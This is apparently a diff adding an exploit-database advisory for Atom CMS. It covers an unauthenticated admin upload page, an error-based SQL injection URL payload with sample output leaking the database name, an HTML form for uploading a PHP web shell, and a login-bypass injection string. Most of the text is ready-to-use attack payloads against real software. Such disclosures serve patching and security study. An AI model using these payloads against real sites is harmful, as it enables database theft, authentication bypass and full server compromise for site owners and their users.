@@ -1,0 +1,87 @@
+id: 22418
+date: 07/08/2014
+title: Atom CMS Shell Upload / SQL Injection / Bypass Vulnerabilities
+author: Jagriti Sahu
+cves: 
+
+##################################################################################################
+#Exploit Title : Atom CMS SQL Injection and file upload vulnerability
+#Author        : Jagriti Sahu
+#Vendor        : https://github.com/thedigicraft/Atom.CMS
+#Date          : 07/07/2014
+#Discovered at : IndiShell Lab
+#Love to       : Surbhi, Mradula and Harry
+##################################################################################################
+
+////////////////////////
+/// Overview:
+////////////////////////
+Atom CMS suffers from remote SQL injection and php shell 
+uploadvulnerability.
+both vulnerabilities are of high risk, SQL injection will expose data 
+stored in database whereas unrestricted file upload will cause php shell 
+on server
+
+///////////////////////////////
+// Vulnerability Description:
+///////////////////////////////
+vulnerability is due to /admin/uploads.php file in which there is no 
+check who is accessing it(this file is only for admin user but a guest 
+user can also access it)
+parameter $_GET[ 'id' ]  is not getting filtered before supplying its 
+data to sql queries which arising sql injection exploit
+and avatar image upload code is not checking whether file is an image 
+or other kind of file which leads to php shell upload
+
+
+///////////////////////
+///  exploit code  ////
+///////////////////////
+
+
+SQL injection exploitation
+==========================
+
+http://127.0.0.1/acms/admin/uploads.php?id=1 and(select 1 FROM(select 
+count(*),concat((select (select concat(database())) FROM 
+information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM 
+information_schema.tables GROUP BY x)a)
+
+in result you will get database name in last line of the message on the 
+page
+
+UPDATE users SET avatar = '1404709440490.' WHERE id = 1 and(select 1 
+FROM(select count(*),concat((select (select concat(database())) FROM 
+information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM 
+information_schema.tables GROUP BY x)a)
+Duplicate entry 'acms1' for key 'group_key'
+
+
+File upload exploitation
+==========================
+
+
+<form action="http://127.0.0.1/atom_cms/admin/uploads.php" 
+method="post"
+enctype="multipart/form-data">
+<label for="file">Filename:</label>
+<input type="file" name="file" id="file"><br>
+<input type="submit" name="submit" value="exploit">
+</form>
+
+
+save this code on your machine as exploit.html
+open it with web browser
+brows your shell and click "exploit" button
+shell will be under directory
+
+http://127.0.0.1/atom_cms/uploads/
+
+---------Bypass Authentication SQL Injection--------------
+
+Vulnerable Code: 	$q = "SELECT * FROM users WHERE email = '$_POST[email]' AND password = SHA1('$_POST[password]')";
+
+Username: ' OR 1 = 1 --
+Password: whatever you want
+
+#  0day.today [2023-03-23]  #
